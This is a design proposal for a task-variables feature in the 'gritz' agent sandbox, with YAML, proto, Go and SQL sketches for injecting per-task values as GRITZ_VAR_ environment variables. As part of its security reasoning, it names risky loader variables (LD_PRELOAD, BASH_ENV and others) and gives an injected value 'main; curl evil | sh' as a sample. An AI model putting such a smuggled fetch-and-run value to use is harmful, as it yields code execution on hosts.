# Task variables in the sandbox environment

Issue: https://github.com/gritzapp/gritz/issues/2215

## Problem

Some workspaces need a per-task value inside the sandbox. A workspace that runs
a user-supplied `process` agent needs to know which Jira story a given task is
for; a workspace that clones "the repo this task is about" needs the repo.

Today the only per-task input is the instruction text, and a `process` agent
only sees it as the rendered prompt on stdin. A workspace's
`container.environment`, `lambda_microvm.environment` and `secrets:` are fixed
per workspace. So the only ways to vary such a value are one workspace per
value, or parsing it out of the prompt.

## Design

**`CreateTask` gains `variables map<string,string>`. The server validates them
against the variables the workspace declares, stores them on the task, and the
runner injects each one into the run's environment as
`GRITZ_VAR_<NAME>`.** Variables are not substituted into workspace config: there
is no templating. They travel to the driver in the run spec the same way
`secrets:` do (non-secret ones in `RunSpec.env`, secret ones in
`RunSpec.secrets`), so the driver needs no new code and secret variables are
masked in the shipped log by the mechanism that already masks workspace
secrets.

A workspace that wants a Jira story key:

```yaml
workspaces:
  story-agent:
    variables:
      JIRA_ISSUE:
        description: The Jira story this task is for
        required: true
        pattern: '[A-Z][A-Z0-9]+-[0-9]+'
      BRANCH:
        description: Branch to check out
        default: main
      DEPLOY_TOKEN:
        description: Short-lived token for the staging deploy
        secret: true
    container:
      image: ghcr.io/gritzapp/gritz-workspace-debian:latest
    commands:
      - git clone --branch "$GRITZ_VAR_BRANCH" https://github.com/acme/app.git /work
    agent:
      type: process
      process:
        command: [/usr/local/bin/story-agent]   # reads $GRITZ_VAR_JIRA_ISSUE
```

```
gritz task create -w story-agent -r prod --var JIRA_ISSUE=APP-142 -i "Implement the story"
```

The sandbox's run environment then carries `GRITZ_VAR_JIRA_ISSUE=APP-142`,
`GRITZ_VAR_BRANCH=main` and no `GRITZ_VAR_DEPLOY_TOKEN` (not set, not
required, no default).

### Naming and collisions

A task's variables come from whoever can create it, which is a wider audience than
whoever writes `workspaces.yaml` (see [Who sets variables](#who-sets-variables)).
Raw names would let a task set `PATH`, `LD_PRELOAD`, `NODE_OPTIONS`,
`GIT_SSH_COMMAND` or `BASH_ENV`, or shadow a workspace's `environment:` or
`secrets:` entry (`GH_TOKEN`), or the runner's own `GRITZ_TOKEN`. Each of those
is code execution or credential substitution inside the sandbox.

Three ways to close that, and the choice:

| Option | Collision-free | Operator effort | Verdict |
| --- | --- | --- | --- |
| Raw names, reject a denylist (`PATH`, `LD_*`, ...) and anything colliding with the workspace's env/secrets | Only as good as the denylist; every runtime adds new loader variables | None | Rejected |
| Workspace declares each variable and the environment variable it maps to (`env: JIRA_ISSUE`) | Yes, if load-time validation checks the mapping against env, secrets and the runner's `GRITZ_` variables | One line per variable | Rejected for v1 |
| Fixed prefix: variable `NAME` is always `GRITZ_VAR_NAME` | Yes, by construction | None | **Chosen** |

**Every task variable is the environment variable `GRITZ_VAR_<NAME>`.** No task variable can
reach an environment variable outside that prefix, whatever the caller sends, so no
denylist has to be complete. `Workspace.Validate` reserves the prefix: an
`environment:` entry (either backend's) or a `secrets:` entry whose name starts
with `GRITZ_VAR_` is a config error, so nothing else in the run environment
can collide with a task variable either. `buildSpecs` asserts that invariant with a
panic rather than resolving a collision.

The mapping option is not wrong, just unnecessary for v1: a tool that insists
on its own environment variable name can be wrapped (`env JIRA_ISSUE="$GRITZ_VAR_JIRA_ISSUE" story-agent`
as the `process` command). It can be added later as an optional `env:` on the
declaration without changing anything else here.

**Names** match `^[A-Z][A-Z0-9_]{0,63}$`: uppercase, so the task variable's name and its environment variable's suffix
are the same string and `foo`/`FOO` can't be two task variables that map to
one environment variable; a leading letter, so the environment variable is a
valid shell identifier. The rule is checked in one place (`taskvar.ValidName`), used by
`Workspace.Validate` on the runner and by the server on every write path.

**Values** are at most 4 KiB, contain no NUL byte (the one byte an environment
value can't hold), and a task has at most 32 variables. Values are otherwise
opaque: newlines and shell metacharacters are allowed, since the environment
carries them as data (see [Reach](#reach)).

### Declared variables only

A workspace declares its variables under `variables:`, keyed by name:

| Field | Meaning |
| --- | --- |
| `description` | Shown in the web UI's new-task form and in `gritz workspaces`. |
| `required` | Creating a task without it fails. |
| `default` | Used when the caller doesn't set it. Not allowed with `required` or `secret`. |
| `pattern` | An RE2 regexp the whole value must match (anchored). The default must match too. Required for a variable a routing rule fills from an event. |
| `secret` | The value is write-only in the API and masked in the shipped log. |

**An undeclared variable is an error** (`InvalidArgument: workspace "story-agent"
declares no variable "JIRA"`), as is a missing required one or a value that
doesn't match its pattern. Allowing undeclared variables was considered and
rejected: the server couldn't know which values are secret, a typo
(`JIRA_ISUE`) would silently produce a task whose agent sees nothing, and the
web UI couldn't render a form. Declaring a variable costs one config line; a
workspace with no `variables:` accepts none.

The runner already sends the server its workspaces with `RegisterWorkspaces`;
`RegisteredWorkspace` gains the declarations, and the server stores them in a
new `workspaces.variables` column. **The server resolves variables once, when the
task is created**: it rejects undeclared, missing-required and non-matching
values, fills in defaults, records which are secret, and stores the result.
The stored set is complete, so the runner injects exactly what the task
carries and never consults its own declarations at run time.

That makes the creation-time declaration authoritative for a task's life. A
runner restarted with a changed `variables:` affects new tasks only: an existing
task keeps its variables, including one the workspace no longer declares, and a
task created before a new required variable was added runs without it. Variables are
immutable after creation, like `namespace`: `UpdateTask` can't change them,
and a restart reruns with the same values. Rechecking at run time would turn a
config edit into failed restarts of existing tasks for no gain.

**Missing variables.** A declared, non-required variable without a default that the
caller didn't set is absent from the task, and its environment variable is unset in the
sandbox (not set to the empty string), so `${GRITZ_VAR_X:-fallback}` and
`[ -n "${GRITZ_VAR_X+x}" ]` behave as a reader expects. An explicit empty
string is a value, kept as such, and must still match `pattern`.

### Reach

Variables are added to the **run's environment**, the one the driver builds with
`driverserver.Env` (the driver process's environ, then `RunSpec.env`, then
`RunSpec.secrets`) and passes to:

- **Setup `commands:`.** The driver runs each with `sh -c` and the run
  environment, on the first run of the sandbox (resuming after the last
  completed command on a restart; see
  [resume setup from failed command](/proposals/implemented/resume-setup-from-failed-command/)).
  Variables are immutable and present from the first run, so `commands:` can use
  them: `git clone --branch "$GRITZ_VAR_BRANCH" ...` works, and a command
  re-run on a restart sees the same value. Referencing it through the environment is
  also the safe form: the shell expands `"$GRITZ_VAR_BRANCH"` as one word of
  data, never as shell syntax, so a value of `main; curl evil | sh` is a
  (bad) branch name, not a command. Unquoted, it is still word-split and
  globbed, so the docs show the quoted form.
- **The agent CLI** (Claude Code, Codex, `process`, ...) and everything it
  spawns: its tool calls, and stdio MCP servers that inherit the environment.
- **The agent's `cwd`**, which the driver already expands against the run
  environment (`envx.Expand(cfg.Cwd, d.Env)`), so `cwd: /work/$GRITZ_VAR_REPO`
  works.

Variables do **not** reach:

- Anything the runner expands when it loads `workspaces.yaml`: `${env:}` and
  `${sh:}` run on the runner host before any task exists, and the image,
  volumes, `mcp_servers` entries and other config fields are fixed per
  workspace. That is the "no templating" line.
- The sandbox's own process environment: the driver process, the container's
  entrypoint, and `gritz shell` sessions, which today don't get the run
  environment either (secrets included). Inside a shell, `cat /proc/<agent
  pid>/environ` finds them, the same as for secrets.

### Who sets variables

Every path that creates a task resolves variables through the same server-side
function, `taskvar.Resolve`, against the workspace's stored declarations.

| Path | How | Secret variables |
| --- | --- | --- |
| `CreateTask` RPC | `variables` (field 9). | Yes |
| MCP `create_task` (`gritz mcp`, server MCP) | `variables` object of string to string. | Yes |
| `gritz task create` | `--var NAME=VALUE`, repeatable. | Yes; `--var NAME=@file` reads the value from a file (`@-` for stdin), so it stays out of shell history and `ps`. |
| Web UI new-task page | One field per declared variable of the selected workspace, from `ListWorkspaces`: description as help text, required marked, default as placeholder, `secret` as a password field. | Yes |
| Schedules | `Schedule.variables`, fixed values set when the schedule is saved, validated then and again on each fire. | **No** |
| Routing rules | `CreateTaskAction.variables`: a literal value, or a key of the event's `details`. | **No** |

**Schedules and rules can't set secret variables.** Their values are stored in the
schedule row or the rule JSON and returned to every org member by
`ListSchedules` and `GetRoutingRules`; a value fixed per schedule or rule is a
workspace secret anyway and belongs in `secrets:`. Saving a schedule or rule
that sets a secret variable is `InvalidArgument`.

**Routing rules and outsiders.** A rule's variables are either a literal
(`value`) or copied from the triggering event's `details` (`detail: "story"`).
The second is what makes variables useful for routed tasks (a custom event
carrying `{"details": {"story": "APP-142"}}`), and it is also an outsider's
input: custom-event rules must be public, a custom event can be posted by any
system holding an org API key (often a relay of a third party's webhook), and
public GitHub rules fire for comments by anyone on an installed repository,
whose `details` (`path`, `side`, ...) come from the event too.

Environment injection already removes the worst outcome: the prefix means an
outsider can only set a `GRITZ_VAR_` variable, and the shell treats its value
as data. What remains is the value's meaning, which the operator's commands and
agent decide (which branch is checked out, which story is worked). So:

- **A rule may fill a variable from `details` only if the workspace declares a
  `pattern` for it.** The server rejects saving a rule that maps an event
  detail into a variable without one, and enforces the pattern on every fired
  value. A pattern is the operator's statement of what any sender may choose
  (`[A-Z][A-Z0-9]+-[0-9]+`, `[a-z0-9-]{1,40}`); a free-form variable can still be
  set by members through the other paths.
- A detail the event doesn't carry leaves the variable unset, so the default or
  the required check applies.
- A resolution failure creates no task. `Route` returns a `*taskvar.Error`,
  which the custom webhook answers with `400 variable "STORY": value "x" does not
  match pattern ...`; GitHub and Jira webhooks log it, as they log other
  routing failures. Only the create branch can fail this way: waking
  subscribed tasks never touches variables.

Rules map from `details` and not from `attrs` because `details` is the
single-valued, free-form part of an event meant for context, and custom event
types already let senders put anything there; `attrs` are lists shaped for
matching.

### Masking

A variable declared `secret: true`:

- **Is write-only in the API.** `Task.variables` lists it with `secret` set and an
  empty `value` in every response (`GetTask`, `ListTasks`, `get_my_task`,
  notifications), the same audience that reads the shipped log, so masking the
  log alone would be pointless. Only `CreateTaskToken` returns its value. That
  RPC needs `OpTaskTokenCreate`, which runner keys hold and task tokens don't;
  an org member with the wildcard scope can call it too, but can also
  `gritz shell` into the sandbox and read the value there, so this is no wider
  than the sandbox's own trust boundary.
- **Reaches the mask through `RunSpec.secrets`.** The runner puts secret variables
  in `backend.Spec.Secrets` (and from there `RunSpec.secrets`) under their
  environment variable name, next to the workspace's secrets. The driver already adds
  `RunSpec.secrets` to the run environment and hands them to the log shipper's
  `redact.Writer` before the first shipped byte, so the value appears in the
  shipped log as `[gritz:masked GRITZ_VAR_DEPLOY_TOKEN]`. No driver change.

The secret flag is recorded on the task when it is created, from the
declaration then in force, and it is what both the API and the runner use. A
later edit that drops `secret:` from a declaration can't expose an existing
task's value.

Secret values are stored in Postgres in plain text, like the instructions and
event payloads beside them; unlike workspace secrets they have to be, since
the server is where they enter. See [Open Questions](#open-questions).

Non-secret variables are not masked. They are as visible as the instruction text.

### Storage

```sql
-- migrate:up
ALTER TABLE tasks ADD COLUMN variables JSONB NOT NULL DEFAULT '[]';
ALTER TABLE workspaces ADD COLUMN variables JSONB NOT NULL DEFAULT '[]';
ALTER TABLE schedules ADD COLUMN variables JSONB NOT NULL DEFAULT '{}';

-- migrate:down
ALTER TABLE schedules DROP COLUMN IF EXISTS variables;
ALTER TABLE workspaces DROP COLUMN IF EXISTS variables;
ALTER TABLE tasks DROP COLUMN IF EXISTS variables;
```

- `tasks.variables`: the resolved `[{"name", "value", "secret"}]`, sorted by name.
  Added to the `CreateTask` insert and the `GetTask`, `GetTaskForUpdate`,
  `ListTasks` and `ListTasksPage` selects. Never updated.
- `workspaces.variables`: the declarations as registered, written by
  `RegisterWorkspaces` (which already replaces a runner's rows wholesale).
- `schedules.variables`: the schedule's `{name: value}` as saved.
- Routing rules are stored as JSON already; `CreateTaskAction` gains a field
  and needs no migration.

A variable is never queried by name, so a JSON column beats a `task_variables` table.

### Proto

```proto
// gritz.v1

// VariableDecl is a variable a workspace declares; see workspaces.yaml variables:.
message VariableDecl {
  string name = 1;
  string description = 2;
  bool required = 3;
  // Used when the task doesn't set it. Never set on a required or secret variable.
  string default = 4;
  // An RE2 expression the whole value must match. Empty matches anything.
  string pattern = 5;
  bool secret = 6;
}

// TaskVariable is one of a task's variables, injected into its sandbox as the
// environment variable GRITZ_VAR_<name>.
message TaskVariable {
  string name = 1;
  // Empty in every response but CreateTaskTokenResponse when secret is set.
  string value = 2;
  bool secret = 3;
}

message RegisteredWorkspace {
  // ... fields 1-4 unchanged
  repeated VariableDecl variables = 5;  // new
}

message Task {
  // ... fields 1-18 unchanged
  // Set at creation and can't be changed. Sorted by name.
  repeated TaskVariable variables = 19;  // new
}

message CreateTaskRequest {
  // ... fields 1-8 unchanged
  // The task's variables, by name. Each must be declared by the workspace;
  // declared defaults fill the rest.
  map<string, string> variables = 9;  // new
}

message CreateTaskTokenResponse {
  string token = 1;
  // The task's variables, secret values included, for the runner to inject.
  repeated TaskVariable variables = 2;  // new
}

message Schedule {
  // ... fields 1-16 unchanged
  // Variables of the tasks it creates. Secret variables can't be set here.
  map<string, string> variables = 17;  // new
}
// CreateScheduleRequest and UpdateScheduleRequest gain the same field.

message CreateTaskAction {
  // ... fields 1-4 unchanged
  // Variables of the tasks the rule creates. Secret variables can't be set here.
  map<string, VariableValue> variables = 5;  // new
}

// VariableValue is where a routing rule takes a variable's value from.
message VariableValue {
  oneof source {
    // A fixed value.
    string value = 1;
    // The key of the triggering event's details to copy. Allowed only for a
    // variable whose declaration has a pattern.
    string detail = 2;
  }
}
```

The variables ride on `CreateTaskTokenResponse` rather than a separate runner RPC
because the runner already calls it for every spec it builds (`TaskManager.specs`),
the handler already loads the task row, and it is the RPC that already returns
a task's sandbox credentials under a scope task tokens don't hold. `GetTask` can't serve: it blanks secret
values for everyone.

`driver.v1.RunSpec` is unchanged apart from its comments: `env` also carries
non-secret variables, `secrets` also carries secret ones.

### API

```go
package taskvar // github.com/gritzapp/gritz/internal/taskvar (new)

// EnvPrefix is the prefix of every task variable's environment variable.
const EnvPrefix = "GRITZ_VAR_"

// Limits on a task's variables.
const (
	MaxVariables  = 32
	MaxValueBytes = 4096
)

// Decl is a variable a workspace declares.
type Decl struct {
	Name        string
	Description string
	Required    bool
	Default     string
	Pattern     string
	Secret      bool
}

// Variable is one of a task's resolved variables.
type Variable struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Secret bool   `json:"secret"`
}

// Error is a variable that fails resolution; callers map it to InvalidArgument or 400.
type Error struct {
	Name   string
	Reason string
}

// Error returns the failure as `variable "NAME": reason`.
func (e *Error) Error() string

// ValidName reports whether name is a valid variable name.
func ValidName(name string) bool

// Env returns the name of the environment variable a task variable is injected as.
func Env(name string) string

// Validate checks a declaration: its name, its pattern, and that its default
// is allowed and matches.
func (d Decl) Validate() error

// Resolve checks given against decls and returns the task's variables, sorted by
// name: defaults filled in, secret flags set, unset optional variables omitted.
func Resolve(decls []Decl, given map[string]string) ([]Variable, error)
```

```go
package workspace // github.com/gritzapp/gritz/internal/runner/workspace

// VariableConfig is a variables: entry; the map key is the variable's name.
type VariableConfig struct { // new
	Description string `yaml:"description"`
	Required    bool   `yaml:"required"`
	Default     string `yaml:"default"`
	Pattern     string `yaml:"pattern"`
	Secret      bool   `yaml:"secret"`
}

type Workspace struct {
	// ...
	// Variables declares the per-task values a task may set, injected as
	// GRITZ_VAR_<NAME>.
	Variables map[string]VariableConfig `yaml:"variables,omitempty"` // new
}

// VariableDecls returns the workspace's declarations, sorted by name.
func (w *Workspace) VariableDecls() []taskvar.Decl // new

// Validate also checks every declaration, and rejects environment: and
// secrets: entries in the GRITZ_VAR_ namespace.
func (w *Workspace) Validate() error // changed
```

```go
package model // github.com/gritzapp/gritz/internal/model

type Task struct {
	// ...
	Variables []taskvar.Variable // new
}

type Schedule struct {
	// ...
	Variables map[string]string // new
}

type CreateTaskAction struct {
	// ...
	Variables map[string]VariableValue // new
}

// VariableValue is a literal Value, or the event Detail to copy.
type VariableValue struct { // new
	Value  string `json:"value,omitempty"`
	Detail string `json:"detail,omitempty"`
}
```

```go
package store // github.com/gritzapp/gritz/internal/store

// GetWorkspaceVariables returns the variable declarations of a runner's registered
// workspace, or a not-found error when it isn't registered.
func (s *Store) GetWorkspaceVariables(ctx context.Context, tx *sql.Tx, runner, workspace string, orgID int64) ([]taskvar.Decl, error) // new; replaces HasWorkspace
```

```go
package runner // github.com/gritzapp/gritz/internal/runner (unexported, shown for the flow)

type specInput struct {
	// ...
	// Variables are the task's variables, from CreateTaskTokenResponse.
	Variables []taskvar.Variable // new
}
```

**How it fits:** the runner's `RegisterWorkspaces` sends each workspace's
`VariableDecls`; the server stores them. `CreateTask`, the MCP `create_task` tool
(through the RPC), `scheduler.Fire` and `eventrouter.Router.create` each call
`store.GetWorkspaceVariables` and `taskvar.Resolve` (the router first turns the
rule's `VariableValue`s and the event's `details` into the given map) and store
the result on `model.Task`. `SetRoutingRules` and the schedule handlers
validate against the same declarations on save. The server's task-to-proto
conversion blanks secret values; `CreateTaskToken` doesn't. `TaskManager.specs`
passes the token response's variables to `buildSpecs`, which adds non-secret ones
to `Spec.Env` and secret ones to `Spec.Secrets` under `taskvar.Env(name)`,
panicking if either key is already present.

## Implementation Plan

1. **`taskvar` package** — Delivers: `ValidName`, `Env`, `Decl.Validate`,
   `Resolve`, `Error`. Depends on: nothing. Verifiable by: table tests over
   names, undeclared/missing/default/pattern/limit cases and secret flags.
2. **Workspace `variables:`** — Delivers: `VariableConfig`, `Workspace.Variables`,
   `VariableDecls`, validation including the reserved prefix in `environment:`
   and `secrets:`; `gritz workspaces` prints declarations. Depends on: (1).
   Verifiable by: `workspace` config tests; a config with a declared variable
   loads, one with a `GRITZ_VAR_` env entry doesn't. Nothing reads variables
   yet.
3. **Migration + proto + store** — Delivers: the three columns, the proto
   messages and fields above, `model.Task.Variables`, the store read/write of
   `tasks.variables` and `workspaces.variables`, `RegisterWorkspaces` storing
   declarations, and the runner sending them. Depends on: (2). Verifiable by:
   migration up/down; store round-trip tests; `ListWorkspaces` returns the
   declarations after a runner registers.
4. **`CreateTask` and `CreateTaskToken`** — Delivers: `GetWorkspaceVariables`
   replacing `HasWorkspace` in `CreateTask`, resolution, secret blanking in
   every task response, variables on `CreateTaskTokenResponse`. Depends on: (3).
   Verifiable by: `apiserver` tests for each rejection, defaults, and a secret
   value absent from `GetTask` but present in `CreateTaskToken`.
5. **Runner injection** — Delivers: `specInput.Variables`, `buildSpecs` adding
   variables to `Spec.Env`/`Spec.Secrets`, `driver.proto` comments. Depends on:
   (4). Verifiable by: `spec_test.go` cases; an e2e test with the dummy agent
   running `env` that sees `GRITZ_VAR_X` and finds a secret variable masked in
   the shipped log.
6. **CLI and MCP** — Delivers: `gritz task create --var` (with `@file`),
   `variables` on the server MCP `create_task` tool, variables in `get_my_task`
   output. Depends on: (4). Verifiable by: command and MCP handler tests.
7. **Web UI: new task and task page** — Delivers: variable fields on
   `tasks.new.tsx` from the selected workspace's declarations; variables shown on
   the task page, secret ones as `••••`. Depends on: (4). Verifiable by:
   creating a task against the dev stack.
8. **Schedules** — Delivers: `schedules.variables` read/write, validation on
   save (no secret variables) and in `scheduler.Fire`, the schedule form fields.
   Depends on: (4), (7) for the shared form component. Verifiable by:
   scheduler tests firing a schedule with variables; `RunSchedule` against the
   dev stack.
9. **Routing rules** — Delivers: `CreateTaskAction.variables`, `VariableValue`,
   save-time validation (declared, not secret, `detail` only with a pattern),
   resolution in `Router.create`, the custom webhook's 400, the rule form
   fields. Depends on: (4). Verifiable by: `eventrouter` tests (literal,
   detail, missing detail, pattern mismatch) and a custom event posted to the
   dev stack creating a task with the variable set.
10. **Docs** — each slice above updates its own pages; this lists them:
    - `operators/workspaces-yaml`: a `variables` section, the reserved prefix
      under "Environment", a `commands:` example quoting `"$GRITZ_VAR_X"`,
      the custom agent process reading one.
    - `operators/secrets`: secret variables, how they are masked, and that
      schedules and rules can't set them.
    - `concepts/tasks`: a "Variables" section (set at creation, immutable,
      where they appear).
    - `concepts/workspaces`: declared variables in "Picking a workspace".
    - `reference/cli`, `using/cli`: `--var`.
    - `integrations/mcp`: `create_task`'s `variables`.
    - `using/agent-tools`: variables in `get_my_task`.
    - `using/web-ui`: variable fields on the new-task page.
    - `concepts/schedules`: variables on a schedule.
    - `concepts/routing-rules` ("Creating tasks"), `integrations/custom-events`
      (mapping `details` into a variable, with a pattern),
      `reference/custom-event-envelope` (`details` can feed variables; the new
      `400`).
    - `reference/api` picks up the proto comments on its own.

## Trade-offs

**`${param:name}` workspace templating (rejected here; [#2217](https://github.com/gritzapp/gritz/pull/2217)
designs it).** Substituting variables into workspace config would let them reach
fields the environment can't: the image, volumes, `mcp_servers` arguments,
`capabilities`. The cost is that the substitution is textual: a variable spliced
into a `commands:` string is shell syntax, so every value needs quoting rules
gritz has to get right, and a public rule mapping an event detail into a
command becomes command injection. The config also stops being a fixed thing
the runner validates once at load: each task's effective workspace has to be
expanded and validated (and the image pulled) per task. Environment variables
keep the config static and the values data, at the cost of reaching only
processes the run environment reaches.

**Separate `RunSpec.variables` field.** The driver could get variables in their own
field and apply the prefix itself. Splitting them across `env` and `secrets`
instead reuses the driver's existing layering and masking unchanged, keeps the
prefix rule in one place on the runner side, and ships with no driver change.

**Resolve at run time on the runner.** The runner could apply defaults and
check required variables from its own config at each start, making
`workspaces.yaml` authoritative for every run. It would turn a config edit into
failures of existing tasks, leave the server unable to reject a bad request at
`CreateTask`, and leave the API without a way to know which values to blank.

**Variables as instruction events.** Storing variables as an event in the task's
stream would put them in the timeline and in the runner's replica for free,
but events are readable by everyone who can read the task, which rules out
secret variables, and the runner would have to fold them out of the stream.

## Open Questions

- **Secret retention.** Secret variable values sit in `tasks.variables` for the
  task's life. Should archiving a task clear them (it can't run again without
  unarchiving, and a restart after unarchive would then run without them)?
- **Variables from built-in event attributes.** Should a rule be able to fill a variable from
  a built-in event's attributes (e.g. a Jira event's issue key), or is
  `details` enough until someone needs it?
- **Showing variables to the agent in the first-run brief.** This proposal adds
  them to `get_my_task` only. A `process` agent reads the environment, and
  Claude Code can run `env`; is a line in the brief worth the prompt churn?